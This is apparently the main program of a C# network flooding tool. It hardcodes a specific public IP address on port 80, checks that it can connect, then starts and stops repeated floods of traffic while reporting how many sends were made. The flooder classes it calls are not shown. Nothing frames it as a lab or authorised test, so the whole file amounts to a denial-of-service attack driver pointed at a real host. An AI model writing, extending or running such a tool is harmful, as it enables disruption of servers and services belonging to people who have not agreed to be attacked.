using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FloodTest
{
    class Program
    {
        static void Main(string[] args)
        {
            FloodConfig config = new FloodConfig
            {
                Ip = "194.0.219.107",
                Port = 80,
                Blocking = true,
                NoDelay = true,
                Delay = 50
            };

            TryConnect(config);

            Console.WriteLine("\nPress to start flood...");
            Console.ReadLine();

            FloodArray flooder = new FloodArray();

            flooder.LogEvent += (sender, message) => Console.WriteLine(message);

            flooder.Init(config);

            Task.Factory.StartNew(MonitorCount);

            while (true)
            {
                Console.WriteLine("Press to start...");
                Console.ReadLine();

                flooder.Flood();

                Console.ReadLine();

                flooder.Stop();
            }
        }

        static void MonitorCount()
        {
            while (true)
            {
                Thread.Sleep(2000);

                Console.WriteLine($"Send {Flooder.Count}");
            }

          
        }

        static void TryConnect(FloodConfig config)
        {
            Console.WriteLine("Try connect");

            using (Flooder testFlooder = new Flooder(config))
            {
                Console.WriteLine($"Connect {testFlooder.IpAddress}:{testFlooder.Port}");

                for (int i = 0; i < 10; i++)
                {
                    try
                    {
                        testFlooder.Connect();

                        break;
                    }
                    catch (Exception)
                    {
                        Console.WriteLine($"Reconnecting... ({i + 1})");
                    }
                }


                Console.WriteLine($"Connected {testFlooder.IpAddress}:{testFlooder.Port}");

                int a = testFlooder.Send(); Console.WriteLine($"Sent {a} bytes");
            }
        }
    }
}
